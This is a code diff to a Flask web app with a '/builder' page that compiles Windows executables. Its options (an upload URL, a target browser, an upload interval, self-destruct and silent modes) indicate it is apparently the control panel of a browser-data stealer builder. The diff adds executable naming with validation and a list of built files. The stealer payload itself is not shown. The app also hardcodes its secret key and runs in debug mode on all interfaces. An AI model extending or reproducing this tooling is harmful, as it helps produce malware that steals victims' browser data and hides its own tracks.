@@ -3,6 +3,8 @@ import os
 import zipfile
 import shutil
 from builder import build_executable
+import re
+
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"
@@ -71,14 +73,22 @@ def serve_file(filename):
 
 @app.route("/builder", methods=["GET", "POST"])
 def builder():
+    exe_files = [f for f in os.listdir(BUILD_FOLDER) if f.endswith(".exe")]
+    
     if request.method == "POST":
+        exe_name = request.form.get("exe_name")
         upload_url = request.form.get("upload_url")
         target_browser = int(request.form.get("target_browser"))
         upload_interval = int(request.form.get("upload_interval"))
         self_destruct = "self_destruct" in request.form
         silent = "silent" in request.form
 
+        if not exe_name.endswith(".exe") or not re.match(r'^[a-zA-Z0-9_-]+\.exe$', exe_name):
+            flash("Executable name must end with .exe and contain only letters, numbers, underscores, or hyphens", "error")
+            return redirect(url_for("builder"))
+
         success, result = build_executable(
+            exe_name=exe_name,
             upload_url=upload_url,
             target_browser=target_browser,
             upload_interval=upload_interval,
@@ -88,13 +98,15 @@ def builder():
         )
 
         if success:
-            flash("Executable built successfully!", "success")
-            return send_from_directory(BUILD_FOLDER, os.path.basename(result), as_attachment=True)
+            flash("Executable built successfully! Download it from the table below.", "success")
+            return redirect(url_for("builder"))
         else:
             flash(f"Build failed: {result}", "error")
             return redirect(url_for("builder"))
 
-    return render_template("builder.html")
+    return render_template("builder.html", exe_files=exe_files)
+
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
